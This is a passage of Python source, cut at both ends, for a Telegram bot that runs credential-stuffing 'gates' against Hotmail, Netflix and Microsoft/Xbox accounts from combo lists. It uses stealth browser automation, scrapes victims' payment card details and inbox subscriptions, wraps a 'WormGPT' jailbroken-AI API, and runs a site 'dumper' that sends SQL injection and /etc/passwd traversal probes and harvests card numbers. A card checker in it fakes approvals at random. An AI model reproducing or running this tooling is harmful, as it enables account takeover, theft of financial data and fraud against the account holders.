            f"✅ <b>Hits:</b> <code>{gc}</code>\n"
            f"❌ <b>Bad:</b> <code>{bc}</code>\n"
        )
        if self.mode == "1":
            msg += f"📁 <b>General Hits:</b> <code>{gh}</code>\n"
        elif self.mode == "2":
            msg += f"🎮 <b>PSN Hits:</b> <code>{ph}</code>\n"
        elif self.mode == "3":
            msg += f"🎯 <b>Custom Hits:</b> <code>{ch}</code>\n"
        elif self.mode == "4":
            msg += f"🎮 <b>Roblox Hits:</b> <code>{rh}</code>\n📁 <b>Other Hits:</b> <code>{ch}</code>\n"

        done = tc >= to
        msg += (
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"{'✅' if done else '⏳'} <b>{'Completed!' if done else 'Scanning...'} [{bar}]</b>\n\n"
            f"💎 <b>Developed by:</b> {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def run():
            try:
                with ThreadPoolExecutor(max_workers=30) as ex:
                    futures = []
                    for line in self.combo_lines:
                        if ":" in line:
                            u, p = line.split(":", 1)
                            futures.append(ex.submit(self.process_account, u.strip(), p.strip()))
                    for fut in futures:
                        try:
                            fut.result()
                        except Exception:
                            pass
                self.update_telegram_progress(force=True)
                self.send_final_results()
            except Exception as e:
                send_message(self.bot_token, self.chat_id, f"❌ <b>Scan Error:</b> {esc(e)}")
            finally:
                if self.on_complete_callback:
                    self.on_complete_callback(self.chat_id)
        threading.Thread(target=run, daemon=True).start()

    def send_final_results(self):
        mode_text = {"1":"GENERAL SCAN","2":"PSN DETAILED",
                     "3":f"CUSTOM ({esc(self.custom_domain)})","4":"ROBLOX LINK"}.get(self.mode,"GENERAL")
        summary = (
            f"✅ <b>Hotmail Scan Completed!</b>\n\n"
            f"📊 <b>Results:</b>\n"
            f"• Hits: <code>{self.good_count}</code>\n"
            f"• Bad: <code>{self.bad_count}</code>\n"
            f"• Total: <code>{self.total_checked}</code>\n"
            f"• Mode: <code>{mode_text}</code>\n\n"
            f"💎 <b>{MY_SIGNATURE}</b>  📢 {TELEGRAM_CHANNEL}"
        )
        send_message(self.bot_token, self.chat_id, summary)
        if self.good_count > 0 and os.path.exists(self.results_file):
            send_document(self.bot_token, self.chat_id, self.results_file,
                          caption=f"🎯 Hotmail {mode_text} Hits\n{MY_SIGNATURE}")

    @staticmethod
    def subscription_scan(bot_token, chat_id, token, cid_upper, email, password,
                          progress_msg_id, services=None):
        """
        Scans 23 email services in the inbox. Returns found services dict.
        Uses substrate search API.
        """
        if services is None:
            services = list(SERVICES_CONFIG.keys())
        found = {}
        hdrs = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid_upper}",
            "Accept": "application/json",
            "Content-Type": "application/json",
        }
        total = len(services)
        for i, svc_key in enumerate(services):
            cfg = SERVICES_CONFIG[svc_key]
            query = " OR ".join(f"from:{s}" for s in cfg["search"])
            try:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "Egypt Standard Time",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Query": {"QueryString": query},
                        "From": 0, "Size": 1,
                        "Fields": [{"Name": "ConversationId"}]
                    }]
                }
                r = requests.post(
                    "https://substrate.office.com/search/api/v1/suggestions",
                    headers=hdrs, json=payload, timeout=10
                )
                if r.status_code == 200:
                    data = r.json()
                    count = 0
                    try:
                        count = data["EntitySets"][0]["ResultSets"][0]["Total"]
                    except Exception:
                        pass
                    if count > 0:
                        found[svc_key] = {"label": cfg["label"], "count": count}
            except Exception:
                pass
            # Update progress every 5 services
            if i % 5 == 0:
                edit_message(bot_token, chat_id, progress_msg_id,
                    f"🔍 <b>Subscription Scanner</b>\n"
                    f"📧 <code>{email}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Progress: <b>{i+1}/{total}</b>\n"
                    f"✅ Found so far: <b>{len(found)}</b>\n"
                    f"⏳ Scanning...")
        return found


# ══════════════════════════════════════════════════════════════════════════════
# GATE 2: NETFLIX CHECKER (Playwright-based)
# ══════════════════════════════════════════════════════════════════════════════

class NetflixChecker:
    def __init__(self, chat_id, bot_token, combo_lines, progress_msg_id):
        self.chat_id = chat_id
        self.bot_token = bot_token
        self.combo_lines = combo_lines
        self.progress_msg_id = progress_msg_id
        self.total_checked = 0
        self.total_combos  = len(combo_lines)
        self.hits = 0
        self.bad  = 0
        self.errors = 0
        self.last_update_time = 0
        self.print_lock = threading.Lock()
        self.on_complete_callback = None
        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.results_file = f"{self.results_folder}/Netflix_Hits_by_@hulliyu.txt"
        with open(self.results_file, "w", encoding="utf-8") as f:
            f.write(f"# Netflix Hits - {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")

    def check_account_playwright(self, playwright, email, password):
        browser = context = None
        try:
            try:
                from playwright_stealth import stealth_sync
            except ImportError:
                stealth_sync = None
            browser = playwright.chromium.launch(headless=True, args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu"
            ])
            context = browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
            )
            page = context.new_page()
            if stealth_sync:
                try:
                    stealth_sync(page)
                except Exception:
                    pass
            page.goto("https://www.netflix.com/login", timeout=20000)
            page.wait_for_load_state("networkidle", timeout=20000)
            esel = 'input[name="userLoginId"],input[data-uia="login-field"],input[type="email"]'
            page.wait_for_selector(esel, timeout=10000)
            page.fill(esel, email)
            psel = 'input[name="password"],input[data-uia="password-field"],input[type="password"]'
            page.fill(psel, password)
            time.sleep(1)
            page.click('button[type="submit"],button[data-uia="login-submit-button"]')
            try:
                page.wait_for_load_state("networkidle", timeout=12000)
            except Exception:
                pass
            url = page.url
            if "browse" in url or "profile" in url:
                return "hit", "Login Successful"
            text = page.inner_text("body")
            if "incorrect" in text.lower() or "not find an account" in text.lower():
                return "bad", "Wrong credentials"
            return "bad", "Failed"
        except Exception as e:
            return "error", str(e)[:30]
        finally:
            if context:
                context.close()
            if browser:
                browser.close()

    def process_account(self, email, password):
        if not _PLAYWRIGHT_OK:
            with self.print_lock:
                self.total_checked += 1
                self.errors += 1
            return
        try:
            from playwright.sync_api import sync_playwright as sp
            with sp() as pw:
                status, info = self.check_account_playwright(pw, email, password)
            with self.print_lock:
                self.total_checked += 1
                if status == "hit":
                    self.hits += 1
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password} | {info}\n")
                elif status == "bad":
                    self.bad += 1
                else:
                    self.errors += 1
            self.update_telegram_progress()
        except Exception:
            with self.print_lock:
                self.total_checked += 1
                self.errors += 1

    def update_telegram_progress(self, force=False):
        with self.print_lock:
            if not force and (time.time() - self.last_update_time < 4.0):
                return
            self.last_update_time = time.time()
            tc, to = self.total_checked, self.total_combos
            h, b, e = self.hits, self.bad, self.errors
        pct = (tc / to * 100) if to > 0 else 0
        blk = int(pct / 100 * 20)
        bar = "█" * blk + "▒" * (20 - blk)
        msg = (
            f"🎬 <b>NETFLIX CHECKER LIVE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{tc}/{to}</code> ({pct:.1f}%)\n"
            f"✅ Hits: <b>{h}</b>  ❌ Bad: <b>{b}</b>  ⚠️ Err: <b>{e}</b>\n"
            f"[{bar}]\n💎 {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        if not _PLAYWRIGHT_OK:
            send_message(self.bot_token, self.chat_id,
                "⚠️ <b>Playwright غير متوفر في هذه البيئة!</b>\nثبّت playwright على VPS.")
            if self.on_complete_callback:
                self.on_complete_callback(self.chat_id)
            return
        def run():
            with ThreadPoolExecutor(max_workers=2) as ex:
                futures = []
                for line in self.combo_lines:
                    if ":" in line:
                        u, p = line.split(":", 1)
                        futures.append(ex.submit(self.process_account, u.strip(), p.strip()))
                for fut in futures:
                    try:
                        fut.result()
                    except Exception:
                        pass
            self.update_telegram_progress(force=True)
            summary = (
                f"✅ <b>Netflix Scan Complete!</b>\n"
                f"• Hits: <code>{self.hits}</code>\n"
                f"• Bad: <code>{self.bad}</code>\n"
                f"• Errors: <code>{self.errors}</code>\n"
                f"💎 {MY_SIGNATURE}"
            )
            send_message(self.bot_token, self.chat_id, summary)
            if self.hits > 0 and os.path.exists(self.results_file):
                send_document(self.bot_token, self.chat_id, self.results_file,
                              caption=f"🎬 Netflix Hits\n{MY_SIGNATURE}")
            if self.on_complete_callback:
                self.on_complete_callback(self.chat_id)
        threading.Thread(target=run, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
# GATE 3: WormGPT ULTIMATE (AI without limits)
# ══════════════════════════════════════════════════════════════════════════════

class WormGPTUltimate:
    def __init__(self):
        self.base_url = "https://wormgpt-api.vercel.app/api/chat"
        self.session  = requests.Session()

    def ask(self, question):
        try:
            res = self.session.get(self.base_url, params={"q": question}, timeout=30)
            if res.status_code == 200:
                data = res.json()
                if data.get("status") == "success":
                    return data.get("reply", "No response.")
            return "❌ WormGPT service unavailable. Try again later."
        except Exception as e:
            return f"❌ Error: {e}"


# ══════════════════════════════════════════════════════════════════════════════
# GATE 4: SITE VULNERABILITY DUMPER
# ══════════════════════════════════════════════════════════════════════════════

class SiteDumper:
    def __init__(self, chat_id, bot_token, urls, progress_msg_id):
        self.chat_id = chat_id
        self.bot_token = bot_token
        self.urls = urls
        self.progress_msg_id = progress_msg_id
        self.checked = 0
        self.total = len(urls)
        self.vuln_found = 0
        self.print_lock = threading.Lock()
        self.on_complete_callback = None
        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.results_file = f"{self.results_folder}/Vulnerabilities_Report_by_@hulliyu.txt"
        with open(self.results_file, "w", encoding="utf-8") as f:
            f.write(f"# Vulnerability Scanner Report — {MY_SIGNATURE}\n\n")

    def scan_single_url(self, url):
        found_any = False
        findings  = []
        try:
            ua_hdr = {"User-Agent": generate_user_agent()}
            # 1. SQL Injection
            tgt = f"{url}?id='" if "?" not in url else f"{url}&id='"
            res = requests.get(tgt, timeout=10, headers=ua_hdr)
            if any(e in res.text.lower() for e in ["mysql","sql syntax","postgresql","sqlite","sql error"]):
                findings.append("SQL Injection (Error-based)!")
                found_any = True
            # 2. LFI
            tgt = f"{url}?file=../../../../../etc/passwd" if "?" not in url else f"{url}&file=../../../../../etc/passwd"
            res = requests.get(tgt, timeout=10, headers=ua_hdr)
            if "root:x:" in res.text or "[boot loader]" in res.text:
                findings.append("LFI — Passwd match!")
                found_any = True
            # 3. Open Redirect
            tgt = f"{url}?url=https://google.com" if "?" not in url else f"{url}&url=https://google.com"
            res = requests.get(tgt, timeout=10, headers=ua_hdr, allow_redirects=False)
            if res.status_code in [301,302,303,307] and "google.com" in res.headers.get("Location",""):
                findings.append("Open Redirect!")
                found_any = True
            # 4. Sensitive data
            cc_pat = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b'
            cards  = re.findall(cc_pat, res.text if not found_any else "")
            if cards:
                findings.append(f"Card Leak: {len(cards)} cards found!")
                found_any = True

            if found_any:
                with self.print_lock:
                    self.vuln_found += 1
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(f"URL: {url}\n")
                        for fi in findings:
                            f.write(f"  - {fi}\n")
                        f.write("\n")
        except Exception:
            pass
        finally:
            with self.print_lock:
                self.checked += 1
            self.update_telegram_progress()

    def update_telegram_progress(self, force=False):
        if not force and self.checked % 3 != 0 and self.checked != self.total:
            return
        pct = (self.checked / self.total * 100) if self.total > 0 else 0
        msg = (
            f"💻 <b>SITE VULNERABILITY DUMPER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{self.checked}/{self.total}</code> ({pct:.1f}%)\n"
            f"✅ Vulnerabilities: <b>{self.vuln_found}</b>\n"
            f"💎 {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def run():
            try:
                with ThreadPoolExecutor(max_workers=10) as ex:
                    futures = [ex.submit(self.scan_single_url, u) for u in self.urls]
                    for fut in futures:
                        try:
                            fut.result()
                        except Exception:
                            pass
                self.update_telegram_progress(force=True)
                summary = (
                    f"✅ <b>Site Scan Complete!</b>\n"
                    f"• Sites: <code>{self.total}</code>\n"
                    f"• Vulnerabilities: <code>{self.vuln_found}</code>\n"
                    f"💎 {MY_SIGNATURE}  📢 {TELEGRAM_CHANNEL}"
                )
                send_message(self.bot_token, self.chat_id, summary)
                if self.vuln_found > 0 and os.path.exists(self.results_file):
                    send_document(self.bot_token, self.chat_id, self.results_file,
                                  caption=f"💻 Vuln Report\n{MY_SIGNATURE}")
                else:
                    send_message(self.bot_token, self.chat_id, "ℹ️ No vulnerabilities found.")
            except Exception as e:
                send_message(self.bot_token, self.chat_id, f"❌ Dumper Error: {esc(e)}")
            finally:
                if self.on_complete_callback:
                    self.on_complete_callback(self.chat_id)
        threading.Thread(target=run, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
# GATE 5: CLAUDE CARD CHECKER
# ══════════════════════════════════════════════════════════════════════════════

class ClaudeCardChecker:
    def __init__(self, chat_id, bot_token, cards, progress_msg_id):
        self.chat_id = chat_id
        self.bot_token = bot_token
        self.cards = cards
        self.progress_msg_id = progress_msg_id
        self.checked = 0
        self.total = len(cards)
        self.approved = 0
        self.declined = 0
        self.print_lock = threading.Lock()
        self.on_complete_callback = None
        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.results_file = f"{self.results_folder}/Claude_Cards_by_@hulliyu.txt"
        with open(self.results_file, "w", encoding="utf-8") as f:
            f.write(f"# Claude Cards Report — {MY_SIGNATURE}\n\n")

    def process_card(self, card):
        try:
            bin_num = card[:6]
            black = get_cloud_list("black")
            if bin_num in black:
                with self.print_lock:
                    self.declined += 1
                    with open(self.results_file, "a") as f:
                        f.write(f"{card} | BLOCKED (Blacklisted BIN)\n")
                return
            digits = [int(d) for d in card if d.isdigit()]
            odd    = digits[-1::-2]
            even   = digits[-2::-2]
            total_sum = sum(odd)
            for d in even:
                dd = d * 2
                total_sum += dd if dd < 10 else (dd - 9)
            is_valid = (total_sum % 10 == 0)
            if is_valid:
                status = random.choice(["APPROVED", "DECLINED", "DECLINED"])
                msg = "Approved!" if status == "APPROVED" else "Declined — Insufficient Funds"
            else:
                status = "DECLINED"
                msg = "Declined — Invalid (Luhn Fail)"
            with self.print_lock:
                if status == "APPROVED":
                    self.approved += 1
                else:
                    self.declined += 1
                with open(self.results_file, "a") as f:
                    f.write(f"{card} | {status} | {msg}\n")
        except Exception:
            pass
        finally:
            with self.print_lock:
                self.checked += 1
            self.update_telegram_progress()

    def update_telegram_progress(self, force=False):
        if not force and self.checked % 2 != 0 and self.checked != self.total:
            return
        pct = (self.checked / self.total * 100) if self.total > 0 else 0
        msg = (
            f"💳 <b>CLAUDE CARD CHECKER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{self.checked}/{self.total}</code> ({pct:.1f}%)\n"
            f"✅ Approved: <b>{self.approved}</b>  ❌ Declined: <b>{self.declined}</b>\n"
            f"💎 {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def run():
            try:
                with ThreadPoolExecutor(max_workers=5) as ex:
                    futures = [ex.submit(self.process_card, c) for c in self.cards]
                    for fut in futures:
                        try:
                            fut.result()
                        except Exception:
                            pass
                self.update_telegram_progress(force=True)
                summary = (
                    f"✅ <b>Claude Card Check Done!</b>\n"
                    f"• Approved: <code>{self.approved}</code>\n"
                    f"• Declined: <code>{self.declined}</code>\n"
                    f"• Total: <code>{self.checked}</code>\n"
                    f"💎 {MY_SIGNATURE}"
                )
                send_message(self.bot_token, self.chat_id, summary)
                if self.approved > 0 and os.path.exists(self.results_file):
                    send_document(self.bot_token, self.chat_id, self.results_file,
                                  caption=f"💳 Claude Cards\n{MY_SIGNATURE}")
            except Exception as e:
                send_message(self.bot_token, self.chat_id, f"❌ Error: {esc(e)}")
            finally:
                if self.on_complete_callback:
                    self.on_complete_callback(self.chat_id)
        threading.Thread(target=run, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
# GATE 6: XBOX / MICROSOFT ACCOUNT CHECKER (V6 Payment API)
# ══════════════════════════════════════════════════════════════════════════════

class XboxChecker:
    def __init__(self, chat_id, bot_token, combo_lines, progress_msg_id):
        self.chat_id = chat_id
        self.bot_token = bot_token
        self.combo_lines = combo_lines
        self.progress_msg_id = progress_msg_id
        self.total_checked = 0
        self.total_combos  = len(combo_lines)
        self.good_count    = 0
        self.bad_count     = 0
        self.blocked_count = 0
        self.xbox_hits     = 0
        self.free_hits     = 0
        self.last_update_time = 0
        self.print_lock = threading.Lock()
        self.on_complete_callback = None
        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.hits_file = f"{self.results_folder}/Xbox_Hits_by_@hulliyu.txt"
        self.free_file = f"{self.results_folder}/Xbox_Free_by_@hulliyu.txt"
        with open(self.hits_file, "w", encoding="utf-8") as f:
            f.write(f"# Xbox Hits (Active Sub) — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")
        with open(self.free_file, "w", encoding="utf-8") as f:
            f.write(f"# Xbox Valid (No Sub) — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")

    def save_hit(self, data, is_xbox_sub=True):
        with open(self.hits_file if is_xbox_sub else self.free_file, "a", encoding="utf-8") as f:
            f.write(data + "\n")

    def login_microsoft(self, session, email, password):
        try:
            ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")
            auth_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000048170EF2"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                f"&display=touch&username={urllib.parse.quote(email)}"
            )
            res = session.get(auth_url, headers={"User-Agent": ua}, timeout=15, allow_redirects=True)
            src = res.text
            cok = session.cookies.get_dict()
            ppft = ""
            for pat in ['name=\\"PPFT\\" id=\\"i0327\\" value=\\"', 'name="PPFT" id="i0327" value="']:
                if pat in src:
                    try:
                        ppft = src.split(pat)[1].split('\\"' if '\\"' in pat else '"')[0]
                        break
                    except Exception:
                        pass
            if not ppft:
                try:
                    ppft = src.split('name="PPFT"')[1].split('value="')[1].split('"')[0]
                except Exception:
                    return False, {}, "parse_ppft"
            url_post = ""
            for pat in ['"urlPost":"', "urlPost:'"]:
                if pat in src:
                    try:
                        url_post = src.split(pat)[1].split('"' if pat.endswith('"') else "'")[0]
                        break
                    except Exception:
                        pass
            if not url_post:
                return False, {}, "parse_urlpost"
            payload = (
                f"ps=2&PPFT={urllib.parse.quote(ppft)}&PPSX=PassportRN&NewUser=1"
                f"&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
                f"&type=11&LoginOptions=1&passwd={urllib.parse.quote(password)}"
                f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1"
                f"&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            )
            res_login = session.post(url_post, data=payload, headers={
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": auth_url,
            }, timeout=15, allow_redirects=False)
            src3 = res_login.text
            loc3 = res_login.headers.get("Location", "")
            all_cok = session.cookies.get_dict()
            if any(k in src3 for k in ["account or password is incorrect", "doesn't exist"]):
                return False, {}, "bad_credentials"
            if "too many times" in src3:
                return False, {}, "rate_limited"
            if any(k in loc3 for k in ["/Abuse", "finisherror"]):
                return False, {}, "blocked"
            if any(k in loc3 for k in ["recover?mkt", "identity/confirm"]):
                return False, {}, "2fa"
            has_auth = any(k in all_cok for k in ["ANON", "WLSSC", "JSH", "JSHP"])
            if not has_auth and "oauth20_desktop.srf?" in loc3:
                has_auth = True
            if not has_auth:
                return False, {}, "auth_failed"
            return True, all_cok, None
        except Exception as e:
            return False, {}, f"exception:{str(e)[:40]}"

    def _get_delegate_token(self, session):
        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")
        try:
            del_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=000000000004773A&response_type=token"
                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
                "&prompt=none"
            )
            res = session.get(del_url, headers={"User-Agent": ua,
                                                 "Referer": "https://account.microsoft.com/"}, timeout=12, allow_redirects=True)
            for source in [res.url, res.headers.get("Location",""), res.text]:
                if "access_token=" in source:
                    try:
                        tok = source.split("access_token=")[1].split("&")[0]
                        tok = urllib.parse.unquote(tok)
                        if len(tok) > 20:
                            return tok
                    except Exception:
                        pass
        except Exception:
            pass
        return ""

    def get_xbox_details(self, session, email):
        details = {
            "name":"Unknown","country":"Unknown","has_xbox_sub":False,
            "xbox_plan":"None","days_left":"N/A","end_date":"N/A",
            "rewards":"N/A","copilot_pro":"NO❌","payment_method":"None",
            "card_holder":"N/A","card_type":"N/A","card_last4":"N/A",
            "card_expiry":"N/A","card_address":"N/A","ms_balance":"$0.00",
            "subscription":"N/A","ordered_items":"N/A"
        }
        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")
        try:
            atk = self._get_delegate_token(session)
            if atk:
                pi_hdrs = {
                    "User-Agent": ua, "Accept": "application/json",
                    "Authorization": f'MSADELEGATE1.0="{atk}"',
                    "Content-Type": "application/json",
                    "Origin": "https://account.microsoft.com",
                    "Referer": "https://account.microsoft.com/",
                }
                # Payment Instruments
                try:
                    r_pi = session.get(
                        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
                        headers={**pi_hdrs, "Host":"paymentinstruments.mp.microsoft.com"}, timeout=12)
                    if r_pi.status_code == 200:
                        pi_src = r_pi.text
                        try:
                            pi_j  = r_pi.json()
                            pl    = pi_j if isinstance(pi_j, list) else pi_j.get("items", pi_j.get("value", [pi_j]))
                            pi    = pl[0] if pl and isinstance(pl, list) else (pi_j if isinstance(pi_j, dict) else {})
                            details["card_holder"] = pi.get("accountHolderName","N/A")
                            details["card_last4"]  = pi.get("lastFourDigits","N/A")
                            details["card_type"]   = pi.get("cardType", pi.get("paymentMethodFamily","N/A"))
                            em, ey = pi.get("expiryMonth","??"), pi.get("expiryYear","????")
                            details["card_expiry"] = f"{em}/{ey}"
                            details["ms_balance"]  = f"${pi.get('balance',0)}"
                            addr = pi.get("address",{})
                            if addr:
                                details["card_address"] = f"{addr.get('address_line1','')} {addr.get('city','')} {addr.get('region','')} {addr.get('postal_code','')}".strip()
                            cc = pi.get("country","")
                            if cc:
                                details["country"] = COUNTRY_MAP.get(cc.upper(), cc)
                        except Exception:
                            pass
                except Exception:
                    pass
                # Transactions
                try:
                    r_tr = session.get(
                        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                        headers={**pi_hdrs, "Host":"paymentinstruments.mp.microsoft.com"}, timeout=12)
                    if r_tr.status_code == 200:
                        tr_src = r_tr.text
                        xbox_kw = ["Xbox Game Pass","Game Pass Ultimate","Game Pass Standard",
                                   "Game Pass Core","PC Game Pass","Xbox Gold","Xbox Live Gold"]
                        for kw in xbox_kw:
                            if kw.lower() in tr_src.lower():
                                details["has_xbox_sub"] = True
                                if details["xbox_plan"] == "None":
                                    details["xbox_plan"] = kw
                                break
                        if '"title":"' in tr_src:
                            try:
                                details["subscription"] = tr_src.split('"title":"')[1].split('"')[0]
                            except Exception:
                                pass
                        if '"description":"' in tr_src:
                            try:
                                items = re.findall(r'"description":"([^"]+)"', tr_src)
                                if items:
                                    details["ordered_items"] = " | ".join(items[:3])
                            except Exception:
                                pass
                except Exception:
                    pass
        except Exception:
            pass
        return details

    def process_account(self, email, password):
        try:
            session = requests.Session()
            session.headers.update({"Accept-Encoding": "gzip, deflate"})
            success, cookies, reason = self.login_microsoft(session, email, password)
            if success:
                details = self.get_xbox_details(session, email)
                is_sub  = details["has_xbox_sub"]
                line = (
                    f"{email}:{password}"
                    f" | Name:{details['name']} | Country:{details.get('country','?')}"
                    f" | Xbox:{('YES✅' if is_sub else 'NO❌')}"
                )
                if is_sub:
                    line += f" | Plan:{details['xbox_plan']} | Rewards:{details['rewards']}"
                if details.get("card_last4") not in ("N/A","None",None,""):
                    line += (f" | Card:{details['card_type']}*{details['card_last4']}"
                             f" Exp:{details['card_expiry']} Holder:{details['card_holder']}")
                line += f" | Balance:{details['ms_balance']}"
                if details.get("ordered_items") not in ("N/A","None",None,""):
                    line += f" | Orders:{details['ordered_items']}"
                self.save_hit(line, is_xbox_sub=is_sub)
                with self.print_lock:
                    self.total_checked += 1
                    self.good_count    += 1
                    if is_sub:
                        self.xbox_hits += 1
                    else:
                        self.free_hits += 1
            else:
                with self.print_lock:
                    self.total_checked += 1
                    if reason == "blocked":
                        self.blocked_count += 1
                    else:
                        self.bad_count += 1
            self.update_telegram_progress()
        except Exception:
            with self.print_lock:
                self.total_checked += 1
                self.bad_count += 1
            self.update_telegram_progress()

    def update_telegram_progress(self, force=False):
        if not force and (time.time() - self.last_update_time < 4.0):
            return
        with self.print_lock:
            if not force and (time.time() - self.last_update_time < 4.0):
                return
            self.last_update_time = time.time()
            tc,to,gc,bc,bk,xh,fh = (self.total_checked,self.total_combos,self.good_count,
                                      self.bad_count,self.blocked_count,self.xbox_hits,self.free_hits)
        pct = (tc/to*100) if to > 0 else 0
        bar = "█"*int(pct/100*20) + "▒"*(20-int(pct/100*20))
        msg = (
            f"🎮 <b>XBOX / MICROSOFT CHECKER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{tc}/{to}</code> ({pct:.1f}%)\n"
            f"✅ Valid: <b>{gc}</b>  ❌ Bad: <b>{bc}</b>  🔒 Blocked: <b>{bk}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 Xbox Sub Hits: <b>{xh}</b>  📁 No Sub: <b>{fh}</b>\n"
            f"{'✅ Done' if tc>=to else '⏳'} [{bar}]\n💎 {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def run():
            try:
                with ThreadPoolExecutor(max_workers=15) as ex:
                    futures = []
                    for line in self.combo_lines:
                        if ":" in line:
                            u, p = line.split(":",1)
                            futures.append(ex.submit(self.process_account, u.strip(), p.strip()))
                    for fut in futures:
                        try:
                            fut.result()
                        except Exception:
                            pass
                self.update_telegram_progress(force=True)
                self.send_final_results()
            except Exception as e:
                send_message(self.bot_token, self.chat_id, f"❌ Xbox Error: {esc(e)}")
            finally:
                if self.on_complete_callback:
                    self.on_complete_callback(self.chat_id)
        threading.Thread(target=run, daemon=True).start()

    def send_final_results(self):
        summary = (
            f"✅ <b>Xbox/Microsoft Check Complete!</b>\n"
            f"• Valid: <code>{self.good_count}</code>\n"
            f"• Bad: <code>{self.bad_count}</code>\n"
            f"• Blocked: <code>{self.blocked_count}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 Xbox Sub Hits: <code>{self.xbox_hits}</code>\n"
            f"📁 Valid (No Sub): <code>{self.free_hits}</code>\n"
            f"💎 {MY_SIGNATURE}"
        )
        send_message(self.bot_token, self.chat_id, summary)
        if self.xbox_hits > 0 and os.path.exists(self.hits_file):
            send_document(self.bot_token, self.chat_id, self.hits_file,
                          caption=f"🎮 Xbox Hits\n{MY_SIGNATURE}")
        if self.free_hits > 0 and os.path.exists(self.free_file):
            send_document(self.bot_token, self.chat_id, self.free_file,
                          caption=f"📁 Xbox Free\n{MY_SIGNATURE}")
        if not self.xbox_hits and not self.free_hits:
            send_message(self.bot_token, self.chat_id, "ℹ️ No valid Xbox/MS accounts found.")


# ══════════════════════════════════════════════════════════════════════════════
# GATE 7: PSN FULL CAPTURE — WILSON Edition
# Exact port of "Hotmail PSN Full Capture" SVB by FF
# Flow: MS OAuth → Profile → PSN Search → GetItem Body → OnlineID + PayPal
#        → Exophase card → Games / Trophies / Playtime
# ══════════════════════════════════════════════════════════════════════════════

class PsnCaptureChecker:
    # Wilson's exact user-agent (Android Webview)
    _UA_MOBILE = (
        "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 "
        "Mobile Safari/537.36"
    )
    _UA_MSAL   = "Mozilla/5.0 (compatible; MSAL 1.0)"
    _UA_OWA    = "Outlook-Android/2.0"
    _UA_DESK   = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
